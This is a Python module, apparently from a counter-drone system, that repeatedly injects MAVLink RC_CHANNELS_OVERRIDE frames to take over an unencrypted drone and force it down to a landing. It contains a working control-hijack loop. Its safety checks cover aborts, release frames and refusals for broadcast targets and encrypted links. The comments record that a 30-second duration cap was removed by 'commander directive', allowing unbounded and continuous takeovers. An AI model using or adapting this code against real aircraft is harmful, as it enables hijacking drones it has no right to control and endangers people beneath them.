#!/usr/bin/env python3
"""Bounded, immediately-abortable sustained RC_CHANNELS_OVERRIDE takeover.

This is the SUSTAINED-injection primitive behind payload PL-011
(MANEUVER TAKEOVER / CONTROLLED LANDING). It re-emits a single byte-accurate
RC_CHANNELS_OVERRIDE frame (built by backend/mavlink_codec.py) at the RC
update rate to walk a legacy/unencrypted-MAVLink craft down to a controlled
landing — the comparatively humane counterpart to the one-shot
flight-termination / force-disarm effects already in this system.

=============================================================================
SAFETY MODEL (mirrors field-bridge/jam_bridge.py's bounded-burst + abort)
=============================================================================
Authorization is NOT this module's job and is NOT re-implemented here. A
takeover only ever runs because POST /api/payloads/deploy already passed the
full, hardened gate chain (require_commander + effect+target-bound arm token +
_check_tx_not_halted + authorized-target + fire-time IFF-not-friendly +
range-auth lease). This module is the transmit plumbing that the deploy path's
"packet" carries sustain metadata into — it adds NO new authorization path and
NO way to transmit while bypassing those gates.

What this module DOES guarantee, independently and locally:

  1. OPERATOR-CONTROLLED DURATION (commander directive — the artificial 30 s
     hard cap has been REMOVED). The stream runs for the operator-set duration,
     honored verbatim (it may be long), OR — when continuous=True — runs
     continuous-until-stop with no fixed end. There is NO wall-clock ceiling.
     The safety is NOT a timer; it is the kill-switch (item 2) plus the
     neutral-release (item 3). MAX_DURATION_S is retained ONLY as a non-binding
     default reference value and is no longer enforced as a cap.

  2. IMMEDIATELY ABORTABLE. tx_halted (EMERGENCY ABORT / tx_halt / range-auth
     lost) and a per-run stop_event are polled BEFORE EVERY SINGLE FRAME. An
     abort or a graceful stop arriving mid-stream terminates the takeover before
     the next frame goes out — an in-progress controlled-landing is stopped, not
     just future requests refused. This holds for continuous mode too: a
     continuous takeover is always instantly switchable-off.

  3. NEUTRAL-RELEASE ON GRACEFUL END, HONEST END-STATE (F-5). The two stop paths
     differ, and we do NOT claim control returns "immediately" in both:
       * ON NORMAL end-of-window completion, OR on a GRACEFUL operator stop
         (stop_event — a deliberate "Stand Down", not an emergency): we emit a
         short burst of explicit neutral RC_CHANNELS_OVERRIDE "release" frames
         (all channels = 0 => "do not override this channel"), so the craft
         reclaims its own RC PROMPTLY rather than waiting out the autopilot
         timeout. Those release frames are themselves guarded by the tx_halted
         check — if an EMERGENCY ABORT / range-auth-off races in, they are NOT
         sent.
       * ON EMERGENCY ABORT (tx_halted): we STOP transmitting and send NOTHING
         further — transmitting after an EMERGENCY ABORT (or when the range-auth
         lease is off) is forbidden, and that hard rule is NOT relaxed to fire a
         release burst. Because no explicit release goes out, the target
         autopilot LATCHES the last commanded (descent) RC values until ITS OWN
         RC-override timeout (~3 s on ArduPilot/PX4) expires, after which it
         reverts to its own RC/failsafe. Control return is therefore delayed by
         that autopilot timeout, not instantaneous — the honest trade for never
         keying the radio after an abort.

  4. HONEST. RC override has NO effect against an FHSS/encrypted control link
     (ELRS/CRSF, DJI OcuSync, DSMX, hop-paired RC). If the target link is
     encrypted/hop-paired, run_sustained_takeover REFUSES and reports
     not-applicable rather than transmitting uselessly. See
     ENCRYPTED_LINK_PROTOCOLS below and the scope note in mavlink_codec.py.
"""
from __future__ import annotations

import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, List, Optional

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "backend"))
from mavlink_codec import (  # noqa: E402
    payload_maneuver_takeover,
    # F-7: cap and encrypted-link list now imported from the ONE source of
    # truth (mavlink_codec) instead of re-declared here, so a safety cap can't
    # silently drift between the backend and this separately-deployable bridge.
    MANEUVER_TAKEOVER_MAX_DURATION_S,
    ENCRYPTED_LINK_PROTOCOLS,  # noqa: F401  (re-exported for callers/tests)
    classify_override_link,
    link_is_overridable as _codec_link_is_overridable,
    build_rc_channels_override_payload,
    build_packet_v2,
    RC_OVERRIDE_RELEASE,
)

# NON-BINDING default reference window — imported (F-7), identical everywhere by
# construction. Commander directive: this is NO LONGER a hard cap. Duration is
# operator-controlled (honored verbatim, or continuous-until-stop); the kill-
# switch + neutral-release are the real safety, not a wall-clock ceiling.
MAX_DURATION_S = MANEUVER_TAKEOVER_MAX_DURATION_S


def link_is_overridable(protocol: Optional[str], legacy_attested: bool = False) -> bool:
    """FAIL-CLOSED (F-3) applicability gate — thin wrapper over the shared
    mavlink_codec.link_is_overridable so the bridge and the backend apply the
    IDENTICAL rule:

      * encrypted/FHSS link          => False (RC override is a NO-OP).
      * recognized legacy MAVLink     => True.
      * UNKNOWN/empty protocol        => False (fail closed) UNLESS the operator
                                         attested legacy MAVLink
                                         (legacy_attested=True).

    Previously this returned True for an unknown/empty protocol, which for a
    control override defaulted to 'allowed' — now it fails closed."""
    return _codec_link_is_overridable(protocol, legacy_attested=legacy_attested)


@dataclass
class TakeoverResult:
    ok: bool
    frames_sent: int = 0              # controlled-descent override frames
    release_frames_sent: int = 0      # F-5: neutral release frames on normal end
    elapsed_s: float = 0.0
    stopped_early: bool = False       # aborted by tx_halted / stop_event
    not_applicable: bool = False      # refused: encrypted/FHSS link
    error: Optional[str] = None
    reason: Optional[str] = None


def run_sustained_takeover(
    send_frame: Callable[[bytes], None],
    target_system: int,
    target_component: int = 1,
    duration_s: float = 8.0,
    rc_rate_hz: float = 20.0,
    continuous: bool = False,
    stop_event: Optional[threading.Event] = None,
    tx_halted: Optional[Callable[[], bool]] = None,
    target_protocol: Optional[str] = None,
    target_link_legacy_mavlink: bool = False,
    release_frames: int = 3,
    on_started: Optional[Callable[[], None]] = None,
    now: Callable[[], float] = time.monotonic,
    sleep: Callable[[float], None] = time.sleep,
) -> TakeoverResult:
    """Emit RC_CHANNELS_OVERRIDE controlled-landing frames at rc_rate_hz for an
    OPERATOR-CONTROLLED duration (no artificial cap), aborting immediately on
    tx_halted/stop_event.

    send_frame(frame_bytes) does the actual TX (e.g. serial.write). It is
    injected so this is unit-testable with a fake sink and a fake clock.

    Two stop inputs, with DIFFERENT end-states (see module docstring item 3):
      * tx_halted()   — EMERGENCY ABORT / tx_halt / range-auth-off. Polled before
                        every frame; stops the stream and transmits NOTHING
                        further (no release burst) — keying the radio after an
                        abort is forbidden.
      * stop_event    — a GRACEFUL operator "Stand Down". Polled before every
                        frame; stops the stream and (like a normal end-of-window)
                        emits the neutral-release burst so control returns
                        promptly.

    continuous=True runs with NO fixed end (until tx_halted / stop_event); the
    operator-set duration is otherwise honored verbatim, with no hard cap.
    now()/sleep() are injectable for deterministic tests.

    F-3: target_link_legacy_mavlink is the operator's legacy-MAVLink attestation
    used to pass the fail-closed applicability gate for an UNKNOWN protocol.
    """
    # --- Honesty gate (F-3, fail-closed): encrypted/FHSS OR unknown-without-
    #     attestation => not applicable, transmit nothing.
    if not link_is_overridable(target_protocol, legacy_attested=target_link_legacy_mavlink):
        cls = classify_override_link(target_protocol)
        if cls == "encrypted":
            reason = (f"RC override not applicable: target link '{target_protocol}' is "
                      f"encrypted/frequency-hopping — RC_CHANNELS_OVERRIDE is ignored by "
                      f"such a craft. No RF transmitted.")
        else:
            reason = (f"RC override not applicable: target link '{target_protocol}' is "
                      f"unknown/unrecognized and no legacy-MAVLink attestation was given — "
                      f"failing closed. No RF transmitted.")
        return TakeoverResult(ok=False, not_applicable=True, reason=reason)

    # --- F-6: target_system 0 (broadcast) or negative is refused. A 0 target in
    #     MAVLink addresses EVERY craft in range; a sustained override must be
    #     bound to one concrete craft, never sprayed at a swarm.
    if target_system <= 0:
        return TakeoverResult(
            ok=False, not_applicable=True,
            reason=(f"refusing sustained takeover: target_system={target_system} is a "
                    f"broadcast/invalid address — RC override must target one concrete "
                    f"craft, not all craft in range. No RF transmitted."),
        )

    if rc_rate_hz <= 0:
        return TakeoverResult(ok=False, error="rc_rate_hz must be > 0")

    # --- Duration is operator-controlled — honored verbatim, NO hard cap. A
    #     bounded (non-continuous) run needs a positive duration; continuous
    #     mode has no fixed end (runs until tx_halted / stop_event).
    dur = max(0.0, float(duration_s))
    if not continuous and dur <= 0.0:
        return TakeoverResult(ok=False, error="duration_s must be > 0 (or set continuous=True)")
    period = 1.0 / rc_rate_hz

    def _emergency_halted() -> bool:
        # EMERGENCY ABORT / tx_halt / range-auth-off — the caller routes all of
        # these through tx_halted. Suppresses the release burst (no RF after abort).
        return bool(tx_halted is not None and tx_halted())

    def _graceful_stop() -> bool:
        # A deliberate operator Stand Down. Ends the stream but DOES emit the
        # neutral-release burst (control returns promptly), unlike an abort.
        return bool(stop_event is not None and stop_event.is_set())

    # Nothing has been overridden yet — an abort/stop before the first frame just
    # returns having transmitted nothing (no release needed, no craft engaged).
    if _emergency_halted() or _graceful_stop():
        return TakeoverResult(ok=True, stopped_early=True, frames_sent=0, elapsed_s=0.0,
                              reason="stop/abort in effect before takeover start — no RF")

    if on_started is not None:
        on_started()

    start = now()
    deadline = None if continuous else start + dur
    frames = 0
    seq = 0

    def _emit_release() -> int:
        """Emit the neutral RC-override release burst (all channels 0 => 'do not
        override') so the craft reclaims its own RC promptly. Guarded by
        _emergency_halted(): if an EMERGENCY ABORT / range-auth-off races in,
        send NOTHING further. Advances the shared seq counter."""
        nonlocal seq
        released = 0
        if release_frames > 0 and not _emergency_halted():
            release_payload = build_rc_channels_override_payload(
                target_system, target_component,
                chan1=RC_OVERRIDE_RELEASE, chan2=RC_OVERRIDE_RELEASE,
                chan3=RC_OVERRIDE_RELEASE, chan4=RC_OVERRIDE_RELEASE,
            )
            for _ in range(release_frames):
                if _emergency_halted():
                    break
                send_frame(build_packet_v2(70, release_payload, sequence=seq & 0xFF))
                seq += 1
                released += 1
        return released

    try:
        while True:
            # (1) EMERGENCY ABORT / tx_halt / range-auth-off BEFORE every frame —
            #     stop, and transmit NOTHING further (no release).
            if _emergency_halted():
                return TakeoverResult(
                    ok=True, stopped_early=True, frames_sent=frames, elapsed_s=now() - start,
                    reason="EMERGENCY ABORT / tx_halt — takeover terminated mid-stream; "
                           "no further RF (autopilot's own override timeout releases)")
            # (2) GRACEFUL operator Stand Down — stop, emit the release burst so
            #     control returns promptly (this is NOT an emergency abort).
            if _graceful_stop():
                released = _emit_release()
                return TakeoverResult(
                    ok=True, stopped_early=True, frames_sent=frames,
                    release_frames_sent=released, elapsed_s=now() - start,
                    reason=(f"graceful stop (Stand Down); emitted {released} neutral "
                            f"RC-override release frame(s) so control returns promptly"))
            # (3) NORMAL end-of-window completion (bounded run only) — release.
            t = now()
            if deadline is not None and t >= deadline:
                released = _emit_release()
                return TakeoverResult(
                    ok=True, stopped_early=False, frames_sent=frames,
                    release_frames_sent=released, elapsed_s=t - start,
                    reason=(f"bounded takeover window elapsed; emitted {released} neutral "
                            f"RC-override release frame(s) so control returns promptly"))
            # (4) One controlled-landing override frame.
            frame = payload_maneuver_takeover(target_system, target_component, seq=seq & 0xFF)
            send_frame(frame)
            frames += 1
            seq += 1
            # (5) Sleep to the next RC tick, but never past the deadline; wake to
            #     re-check the stop/abort promptly. Continuous mode sleeps a full
            #     period each tick (no deadline).
            if deadline is None:
                sleep(period)
            else:
                remaining = deadline - now()
                if remaining <= 0:
                    continue
                sleep(min(period, remaining))
    except Exception as e:  # never raise out of the transmit loop
        return TakeoverResult(ok=False, frames_sent=frames, elapsed_s=now() - start,
                              error=f"takeover TX error: {e}")
